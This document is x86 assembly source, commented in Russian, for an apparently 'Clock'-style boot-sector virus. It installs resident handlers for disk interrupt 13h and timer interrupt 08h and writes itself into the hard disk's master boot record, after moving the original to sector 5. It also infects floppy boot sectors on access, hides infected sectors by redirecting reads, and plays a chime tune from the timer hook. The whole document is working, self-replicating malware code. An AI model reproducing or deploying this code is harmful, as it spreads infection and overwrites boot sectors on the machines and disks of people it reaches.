seg_a   segment byte public
        assume cs:seg_a,ds:seg_a

        org 0                                   ;смещение в памяти 0
clock   proc    far
start:                                          ;точка входа
;------------------------------------------------------------------------------
;------ установка ss,sp,ds,es -------------------------------------------------
;------------------------------------------------------------------------------
        cli                                     ;запрет прерываний
        xor ax,ax                               ;ss=0, sp=7c00h,
        mov ss,ax                               ;ds=0,
        mov sp,7c00h                            ;es=0
        mov ds,ax                               ;
        mov es,ax                               ;
        sti                                     ;разрешение прерываний
;------------------------------------------------------------------------------
;------ запись прерывания 13h в ячейку программы ------------------------------
;------------------------------------------------------------------------------
        mov si,4ch                              ;передать ds:[si] -> es:[di]
        mov di,(7c00h+offset oldofs)            ;         4 байта    4 байта
        movsw                                   ;
        movsw                                   ;
;------------------------------------------------------------------------------
;------ запись прерывания 08h в ячейку программы ------------------------------
;------------------------------------------------------------------------------
        mov si,20h                              ;передать ds:[si] -> es:[di]
        mov di,(7c00h+offset old8o)             ;         4 байта    4 байта
        movsw                                   ;
        movsw                                   ;
;------------------------------------------------------------------------------
;------ выделение памяти для программы в последних адресах --------------------
;------------------------------------------------------------------------------
        mov ax,word ptr ds:[413h]               ;в ax размер памяти
        dec ax                                  ;уменьшить на 1
        mov word ptr ds:[413h],ax               ;установить обратно
        mov cl,6                                ;перевод Кбайт в байты
        shl ax,cl                               ;для вычисления адреса
        push ax                                 ;загрузить в стек CS
        mov  es,ax                              ;передать в es
;------------------------------------------------------------------------------
;------ занесение в адрес прерывания 13h нового обработчика -------------------
;------------------------------------------------------------------------------
        cli                                     ;запрет прерываний
        mov word ptr ds:[4eh],ax                ;es в адрес сегмента 13h
        mov word ptr ds:[4ch],offset int13      ;новый обработчик в адрес
                                                ;смещения 13h
;------------------------------------------------------------------------------
;------ занесение в адрес прерывания 08h нового обработчика -------------------
;------------------------------------------------------------------------------
        mov word ptr ds:[22h],ax                ;es в адрес сегмента 08h
        mov word ptr ds:[20h],offset int8       ;новый обработчик в адрес
        sti                                     ;смещения 08h
;------------------------------------------------------------------------------
;------ пересылка программы в выделенную память и переход на нее --------------
;------------------------------------------------------------------------------
        mov ax,offset next                      ;
        push ax                                 ;загрузить в стек IP
        mov si,7c00h                            ;si <-- сегмент программы
        xor di,di                               ;обнулить di
        mov cx,200h                             ;cx <-- длина тела программы
        cld                                     ;сбросить флаг направления
        rep movsb                               ;переслать из ds:[si] в es:[di]
        retf                                    ;переход на программу в
                                                ;выделенную память
clock   endp
;------------------------------------------------------------------------------
;------ работа с диском -------------------------------------------------------
;------------------------------------------------------------------------------
next:                                           ;
        push cs                                 ;
        pop ds                                  ;ds=cs
        xor ax,ax                               ;сброс диска
        mov es,ax                               ;es=0
        push es                                 ;занести в стек CS
        call retry                              ;вызов процедуры работы
        mov bx,7c00h                            ;с диском
        push bx                                 ;занести в стек IP
        mov al,byte ptr status                  ;загрузка была с гибкого
        cmp al,0                                ;диска
        mov ax,201h                             ;
        je  floppy                              ;если да, то переход
        mov dx,80h                              ;чтение 5-го сектора
        mov cx,5                                ;жесткого диска
        call retry                              ;
        jmp short boot                          ;переход на загрузку boot
floppy:                                         ;
        mov dx,100h                             ;чтение 2-го сектора
        mov cx,2                                ;диска А
        call retry                              ;
        jc  boot                                ;
        shr dx,1                                ;чтение 1-го сектора
        dec cx                                  ;жесткого диска
        mov bx,200h                             ;в память по адресу
        mov ax,201h                             ;es:bx
        push cs                                 ;
        pop  es                                 ;es=cs
        call retry                              ;
        jc  boot                                ;
        call cmpsec                             ;сравнить данные
        jne false                               ;если не совпадает, то jmp
boot:                                           ;
        mov al,0                                ;установка статуса
        mov byte ptr status,al                  ;
        retf                                    ;переход на программу boot
false:                                          ;
        mov al,2                                ;установка статуса
        mov byte ptr status,al                  ;
        mov cl,5                                ;запись MBR в сектор 5
        mov ax,301h                             ;
        call retry                              ;
        jc  boot                                ;
        mov cl,1				;
        xor bx,bx                               ;запись кода в 1-ый
        mov ax,301h                             ;сектор
        call retry                              ;
        jmp short boot                          ;
;------------------------------------------------------------------------------
;------ программа обработки прерывания 13h ------------------------------------
;------------------------------------------------------------------------------
int13:                                          ;
        push ax                                 ;
        push ds                                 ;сохранить регистры ax и ds
        cmp ah,1                                ;
        jbe end13                               ;если меньше функции 2
        cmp ah,3                                ;и больше функции 3,
        ja  end13                               ;то выход
        or  dl,dl                               ;если жесткий диск
        jnz hard                                ;
        push ax                                 ;
        xor ax,ax                               ;
        mov ds,ax                               ;
        mov al,byte ptr ds:[43fh]               ;если мотор дисковода
        test al,1                               ;отключен, то выход
        jnz evol                                ;
        call make                               ;вызов процедуры записи
evol:                                           ;
        pop ax                                  ;
        cmp al,3                                ;
        jz  end13                               ;
        cmp dh,0                                ;головка 0 ?
        jne end13                               ;если нет
        cmp cx,1                                ;трек 0 : сектор 1 ?
        jne end13                               ;если нет
        inc dh                                  ;подмена головки на 1-ю
        inc cx                                  ;подмена сектора на 2-ой
        jmp short end13                         ;
hard:                                           ;
        test dl,80h                             ;жесткий диск ?
        jz  end13                               ;если нет
        cmp dh,0                                ;головка 0 ?
        jne end13                               ;если нет
        cmp ch,0                                ;трек 0 ?
        jne end13                               ;если нет
        cmp cl,1                                ;сектор 1
        je  under                               ;если да
        cmp cl,5                                ;сектор 5
        jnz end13                               ;если нет
        dec cx                                  ;подменить на 4-ый
        jmp short end13                         ;
under:                                          ;
        mov cl,5                                ;подменить на 5-ый
end13:                                          ;
        pop ds                                  ;
        pop ax                                  ;
        ;jmp far ptr (13h)                      ;переход на процедуру обрабатки
        db 0eah                                 ;прерывания 13h
oldofs  dw 0000h                                ;
oldseg  dw 0000h                                ;
status  db 0                                    ;
;------------------------------------------------------------------------------
;------ программа обработки прерывания 08h ------------------------------------
;------------------------------------------------------------------------------
int8:                                           ;
        push    ax                              ;
        push    bx                              ;
        push    si                              ;
        push    di                              ;
        push    ds                              ;
        push    es                              ;
        pushf                                   ;
        db      9ah                             ;
old8o   dw      0                               ;
old8s   dw      0                               ;
        xor     ax,ax                           ;
        mov     es,ax                           ;
        cmp     word ptr es:[46ch],0ff00h       ;
        jnz     nosound                         ;
        cli                                     ;
        push    cs                              ;
        pop     ds                              ;
        mov     si,offset old8o                 ;
        mov     di,20h                          ;
        movsw                                   ;
        movsw                                   ;
        sti                                     ;
        in      al,61h                          ;
        or      al,00000011b                    ;
        out     61h,al                          ;
        mov     si,offset freq                  ;
        mov     al,0b6h                         ;
        out     43h,al                          ;
        xor     di,di                           ;
next_n:                                         ;
        lodsw                                   ;
        cmp     di,6                            ;
        je      no_more                         ;
        out     42h,al                          ;
        mov     al,ah                           ;
        out     42h,al                          ;
        lodsb                                   ;
        cbw                                     ;
        cmp     al,3                            ;
        jne     no_sub                          ;
        sub     si,6                            ;
        inc     di                              ;
no_sub:                                         ;
        add     ax,word ptr es:[046ch]          ;
still_s:                                        ;
        cmp     ax,word ptr es:[046ch]          ;
        jne     still_s                         ;
        jmp     short next_n                    ;
no_more:                                        ;
        in      al,61h                          ;
        and     al,0fch                         ;
        out     61h,al                          ;
        cli                                     ;
        mov     word ptr es:[22h],ds            ;
        mov     word ptr es:[20h],offset int8   ;
        sti                                     ;
nosound:                                        ;
        pop     es                              ;
        pop     ds                              ;
        pop     di                              ;
        pop     si                              ;
        pop     bx                              ;
        pop     ax                              ;
        iret                                    ;
;------------------------------------------------------------------------------
;------ массив значений для выполнения боя часов ------------------------------
;------------------------------------------------------------------------------
freq    db      23h,0eh,9,0e3h,0bh,9,6fh,9,9,0e3h,0bh,9,97h,0ah,18
        db      0e3h,0bh,9,98h,0ch,9,6fh,9,18,97h,0ah,18,23h,0eh,21
        db      54h,0,15,0e8h,8,3
;------------------------------------------------------------------------------
;------ вызов прерывания 13h --------------------------------------------------
;------------------------------------------------------------------------------
retry   proc    near                            ;
        pushf                                   ;сохранение флагов
        call dword ptr oldofs                   ;обращение к 13h
        ret                                     ;
retry   endp                                    ;
;------------------------------------------------------------------------------
;------ программа сравнения секторов ------------------------------------------
;------------------------------------------------------------------------------
cmpsec  proc    near                            ;сравнение секторов
        mov di,140h                             ;
        mov si,340h                             ;
        cmpsw                                   ;
        jne no_cmp                              ;
        cmpsw                                   ;
no_cmp:                                         ;
        ret                                     ;
cmpsec  endp                                    ;
;------------------------------------------------------------------------------
;------ обработка записи ------------------------------------------------------
;------------------------------------------------------------------------------
make    proc near                               ;
        push di                                 ;сохранение регистров
        push si                                 ;
        push es                                 ;
        push dx                                 ;
        push cx                                 ;
        push bx                                 ;
        push cs                                 ;
        pop  es                                 ;
        push cs                                 ;
        pop  ds                                 ;
        mov  di,3                               ;обращаться 3 раза
        xor dx,dx                               ;считать 1-ый сектор
        mov cx,1                                ;гибкого диска
        mov bx,200h                             ;
reada:                                          ;
        mov ax,201h                             ;
        call retry                              ;
        jnc cmpdata                             ;
        xor ax,ax                               ;
        call retry                              ;
        dec di                                  ;
        jnz reada                               ;
        jmp short exit                          ;
cmpdata:                                        ;
        call cmpsec                             ;
        je  exit                                ;если равно, то выход
        inc dh                                  ;запись boot в 2-ий
        inc cx                                  ;сектор
        mov ax,301h                             ;
        call retry                              ;
        jc  exit                                ;
        dec dh                                  ;
        dec cx                                  ;
        xor bx,bx                               ;
        mov ax,301h                             ;
        call retry                              ;
exit:                                           ;
        pop bx                                  ;
        pop cx                                  ;
        pop dx                                  ;
        pop es                                  ;
        pop si                                  ;
        pop di                                  ;
        ret                                     ;
make    endp                                    ;
;------------------------------------------------------------------------------
        org 1feh                                ;
        dw      0aa55h                          ;слово указывающее на
                                                ;расширение BIOS
seg_a   ends

        end     start
